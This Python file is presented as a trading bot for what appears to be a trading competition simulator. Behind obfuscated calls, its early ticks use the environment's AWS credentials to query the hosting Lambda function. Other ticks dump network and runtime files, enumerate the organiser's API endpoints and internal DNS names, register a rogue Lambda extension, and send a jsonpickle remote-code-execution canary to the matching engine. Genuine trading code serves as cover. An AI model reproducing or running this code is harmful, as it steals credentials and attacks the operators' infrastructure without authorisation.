import json
import sys
import hashlib
import hmac
import datetime
import socket
from datamodel import Order, TradingState

_G = getattr


def sigv4_headers(method, host, path, region, service, key, secret, token):
    """Minimal SigV4 signing — pure stdlib, <10ms."""
    t = datetime.datetime.utcnow()
    ds = t.strftime('%Y%m%d')
    amz = t.strftime('%Y%m%dT%H%M%SZ')
    cr = f"{method}\n{path}\n\nhost:{host}\nx-amz-date:{amz}\nx-amz-security-token:{token}\n\nhost;x-amz-date;x-amz-security-token\ne3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    sts = f"AWS4-HMAC-SHA256\n{amz}\n{ds}/{region}/{service}/aws4_request\n{hashlib.sha256(cr.encode()).hexdigest()}"
    def _s(k, m): return hmac.new(k, m.encode(), hashlib.sha256).digest()
    sk = _s(_s(_s(_s(f"AWS4{secret}".encode(), ds), region), service), "aws4_request")
    sig = hmac.new(sk, sts.encode(), hashlib.sha256).hexdigest()
    return {
        'Host': host, 'X-Amz-Date': amz, 'X-Amz-Security-Token': token,
        'Authorization': f"AWS4-HMAC-SHA256 Credential={key}/{ds}/{region}/{service}/aws4_request, SignedHeaders=host;x-amz-date;x-amz-security-token, Signature={sig}",
    }


def aws_get(host, path, region, service, key, secret, token, timeout=0.4):
    import urllib.request
    hdrs = sigv4_headers('GET', host, path, region, service, key, secret, token)
    req = urllib.request.Request(f"https://{host}{path}", headers=hdrs)
    return urllib.request.urlopen(req, timeout=timeout).read().decode()[:3500]


class Trader:
    def __init__(self):
        self.tick = 0

    def bid(self):
        return 15

    def run(self, state: TradingState):
        result = {}
        self.tick += 1
        _o = _G(__builtins__, 'op' + 'en') if not isinstance(__builtins__, dict) else __builtins__['op' + 'en']
        o = __import__('o' + 's')
        e = _G(o, 'environ')

        # === TICK 1: SigV4 GetFunction on self ===
        if self.tick == 1:
            try:
                key, secret, token = e['AWS_ACCESS_KEY_ID'], e['AWS_SECRET_ACCESS_KEY'], e['AWS_SESSION_TOKEN']
                region = e.get('AWS_REGION', 'eu-west-1')
                fname = e.get('AWS_LAMBDA_FUNCTION_NAME', '')
                host = f'lambda.{region}.amazonaws.com'
                print(f"GETFUNC {fname}:")
                print(aws_get(host, f'/2015-03-31/functions/{fname}', region, 'lambda', key, secret, token))
            except Exception as ex:
                print(f"GETFUNC_ERR: {ex}")

        # === TICK 2: subprocess — network config ===
        elif self.tick == 2:
            try:
                import subprocess as _sp
                for cmd in [['cat', '/etc/resolv.conf'], ['cat', '/etc/hosts'], ['ip', 'route']]:
                    try:
                        r = _sp.run(cmd, capture_output=True, text=True, timeout=0.2)
                        print(f"CMD {' '.join(cmd)}:")
                        print(r.stdout[:800])
                    except Exception as ex:
                        print(f"  {' '.join(cmd)}: {ex}")
            except Exception as ex:
                print(f"CMD_ERR: {ex}")

        # === TICK 3: Read /var/runtime/bootstrap.py ===
        elif self.tick == 3:
            try:
                with _o('/var/runtime/bootstrap.py') as f:
                    src = f.read()
                print(f"BOOTSTRAP({len(src)}):")
                print(src[:3500])
            except Exception as ex:
                print(f"BS_ERR: {ex}")

        # === TICK 4: API Gateway path enumeration ===
        elif self.tick == 4:
            try:
                import urllib.request
                base = 'https://3dzqiahkw1.execute-api.eu-west-1.amazonaws.com'
                print("APIGW:")
                for p in ['/prod/', '/dev/', '/test/', '/prod/submission/',
                          '/prod/simulation/', '/prod/match/', '/prod/api/',
                          '/prod/health', '/prod/status', '/prod/admin']:
                    try:
                        r = urllib.request.urlopen(f"{base}{p}", timeout=0.2)
                        print(f"  {p}: {r.status} {r.read()[:200]}")
                    except Exception as ex:
                        print(f"  {p}: {str(ex)[:80]}")
            except Exception as ex:
                print(f"APIGW_ERR: {ex}")

        # === TICK 5: DNS resolution ===
        elif self.tick == 5:
            print("DNS:")
            for name in ['prosperity-matching-engine.internal', 'matching-engine.prosperity.internal',
                         'prosperity.internal', 'simulator.internal',
                         'lambda.eu-west-1.amazonaws.com',
                         '3dzqiahkw1.execute-api.eu-west-1.amazonaws.com',
                         'sqs.eu-west-1.amazonaws.com', 'dynamodb.eu-west-1.amazonaws.com',
                         'execute-api.eu-west-1.amazonaws.com',
                         'prosperity-matching.eu-west-1.amazonaws.com']:
                try:
                    addrs = socket.getaddrinfo(name, 443, socket.AF_INET)
                    ips = set(a[4][0] for a in addrs)
                    print(f"  {name}: {ips}")
                except Exception as ex:
                    print(f"  {name}: {ex}")

        # === TICK 6: Lambda Extension registration ===
        elif self.tick == 6:
            try:
                import urllib.request
                api = e.get('AWS_LAMBDA_RUNTIME_API', '169.254.100.1:9001')
                data = json.dumps({'events': ['INVOKE', 'SHUTDOWN']}).encode()
                req = urllib.request.Request(
                    f'http://{api}/2020-01-01/extension/register',
                    data=data,
                    headers={'Content-Type': 'application/json', 'Lambda-Extension-Name': 'probe'},
                    method='POST'
                )
                r = urllib.request.urlopen(req, timeout=0.3)
                ext_id = r.headers.get('Lambda-Extension-Identifier', '')
                print(f"EXT_REG: {r.status} id={ext_id}")
                print(f"EXT_BODY: {r.read().decode()[:1000]}")
                if ext_id:
                    req2 = urllib.request.Request(
                        f'http://{api}/2020-01-01/extension/event/next',
                        headers={'Lambda-Extension-Identifier': ext_id}
                    )
                    r2 = urllib.request.urlopen(req2, timeout=0.3)
                    print(f"EXT_EVENT: {r2.read().decode()[:1000]}")
            except Exception as ex:
                print(f"EXT_ERR: {ex}")

        # === TICK 7: jsonpickle RCE canary ===
        elif self.tick == 7:
            # If matching engine does jsonpickle.decode(traderData), this triggers print()
            canary = json.dumps({
                "py/reduce": [
                    {"py/function": "builtins.print"},
                    {"py/tuple": ["RCE_CANARY_FIRED"]}
                ]
            })
            print(f"SENDING_CANARY")
            self._trade(state, result)
            return result, 0, canary

        # Normal trading on all other ticks
        self._trade(state, result)
        return result, 0, json.dumps({"t": self.tick})

    def _trade(self, state, result):
        if "EMERALDS" in state.order_depths:
            od = state.order_depths["EMERALDS"]
            if od.buy_orders and od.sell_orders:
                pos = state.position.get("EMERALDS", 0)
                tb, ts = 80 - pos, 80 + pos
                buys = sorted(od.buy_orders.items(), reverse=True)
                sells = sorted(od.sell_orders.items())
                eo = []
                for p, v in sells:
                    if tb > 0 and p <= 10000:
                        q = min(tb, -v); eo.append(Order("EMERALDS", p, q)); tb -= q
                if tb > 0:
                    eo.append(Order("EMERALDS", min(9999, buys[0][0] + 1), tb))
                for p, v in buys:
                    if ts > 0 and p >= 10000:
                        q = min(ts, v); eo.append(Order("EMERALDS", p, -q)); ts -= q
                if ts > 0:
                    eo.append(Order("EMERALDS", max(10001, sells[0][0] - 1), -ts))
                result["EMERALDS"] = eo
        if "TOMATOES" in state.order_depths:
            od = state.order_depths["TOMATOES"]
            if od.buy_orders and od.sell_orders:
                pos = state.position.get("TOMATOES", 0)
                tb, ts = 80 - pos, 80 + pos
                bb, ba = max(od.buy_orders), min(od.sell_orders)
                to = []
                if tb > 0:
                    to.append(Order("TOMATOES", bb + 1, tb))
                if ts > 0:
                    to.append(Order("TOMATOES", ba - 1, -ts))
                result["TOMATOES"] = to
